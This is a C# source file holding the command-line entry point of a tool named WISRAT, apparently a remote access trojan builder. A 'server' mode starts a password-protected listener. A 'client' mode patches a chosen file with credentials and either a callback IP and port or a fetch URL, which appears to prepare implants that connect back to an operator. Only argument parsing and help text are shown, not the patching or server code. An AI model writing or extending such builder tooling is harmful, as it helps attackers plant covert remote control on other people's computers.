using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using Serilog;
using Serilog.Core;

namespace WISRAT.CLI
{
    /// <summary>
    /// Main CLI class
    /// </summary>
    public static class Program
    {
        /// <summary>
        /// Provides information about CLI
        /// </summary>
        public static class Information
        {
            public static readonly string CliVersion = Assembly.GetEntryAssembly()?.GetName().Version?.ToString();
            public static readonly string RequiredShared = "0.1.0.0";
            public static readonly string RequiredClient = "0.1.0.0";
        }
        
        /// <summary>
        /// Serilog Logger instance
        /// </summary>
        private static readonly Logger Logger = new LoggerConfiguration()
            .WriteTo.Console()
            .CreateLogger();

        /// <summary>
        /// Entry point of CLI
        /// </summary>
        /// <param name="args">Arguments</param>
        public static void Main(string[] args)
        {
            Logger.Information($"WISRat CLI version {Information.CliVersion}");
            Logger.Information($"WISRat Shared version {Shared.Information.SharedVersion}");
            if (Shared.Information.SharedVersion != Information.RequiredShared)
            {
                Logger.Error($"WISRat CLI requires Shared {Information.RequiredShared}!");
                Environment.Exit(1);
            }

            if (args.Length < 1) {
                Logger.Error("Error parsing arguments! \"wisrat help\" for help.");
                Environment.Exit(1);
            }

            var parsed = new Dictionary<string, object>();
            switch (args[0])
            {
                case "help":
                    Logger.Information($"[Help] wisrat server <ip> <port> <password>");
                    Logger.Information($"[Help] wisrat client <filename> <username> <password> -|");
                    Logger.Information($"[Help]    direct <ip> <port>");
                    Logger.Information($"[Help]    fetch <url>");
                    Logger.Information($"[Help] wisrat help");
                    break;
                case "server":
                    try {
                        parsed.Add("ip", args[1]);
                        IPAddress.Parse(args[1]);
                        parsed.Add("port", int.Parse(args[2]));
                        parsed.Add("password", args[3]);
                    } catch {
                        Logger.Error("Error parsing arguments! \"wisrat help\" for help.");
                        Environment.Exit(1);
                    }

                    Logger.Information("Starting server...");
                    Server server = new Server(IPAddress.Parse((string) parsed["ip"]), 
                        (int)parsed["port"], (string) parsed["password"], Logger);
                    Console.CancelKeyPress += (_, _) => {
                        Logger.Warning("SIGINT received, stopping...");
                        server.Dispose();
                        Environment.Exit(0);
                    };
                    Logger.Information("Server started!");
                    while(true) { }
                case "client":
                    try {
                        parsed.Add("filename", args[1]);
                        if (!File.Exists(args[1])) {
                            Logger.Error("File doesn't exist!");
                            throw new Exception();
                        }
                        parsed.Add("username", args[2]);
                        parsed.Add("password", args[3]);
                        parsed.Add("type", args[4]);
                    } catch {
                        Logger.Error("Error parsing arguments! \"wisrat help\" for help.");
                        Environment.Exit(1);
                    }

                    switch (parsed["type"])
                    {
                        case "direct":
                            try {
                                parsed.Add("ip", args[5]);
                                IPAddress.Parse(args[5]);
                                parsed.Add("port", int.Parse(args[6]));
                            } catch {
                                Logger.Error("Error parsing arguments! \"wisrat help\" for help.");
                                Environment.Exit(1);
                            }
                            PatchClient.Patch(Logger, (string)parsed["filename"], 
                                (string)parsed["username"], (string)parsed["password"], 
                                (string)parsed["ip"], (int)parsed["port"]);
                            Logger.Information("Done!");
                            break;
                        case "fetch":
                            try {
                                parsed.Add("url", args[5]);
                            } catch {
                                Logger.Error("Error parsing arguments! \"wisrat help\" for help.");
                                Environment.Exit(1);
                            }
                            PatchClient.Patch(Logger, (string)parsed["filename"], 
                                (string)parsed["username"], (string)parsed["password"], 
                                (string)parsed["url"]);
                            Logger.Information("Done!");
                            break;
                        default:
                            Logger.Error("Error parsing arguments! \"wisrat help\" for help.");
                            Environment.Exit(1);
                            break;
                    }
                    break;
                default:
                    Logger.Error("Error parsing arguments! \"wisrat help\" for help.");
                    Environment.Exit(1);
                    break;
            }
        }
    }
}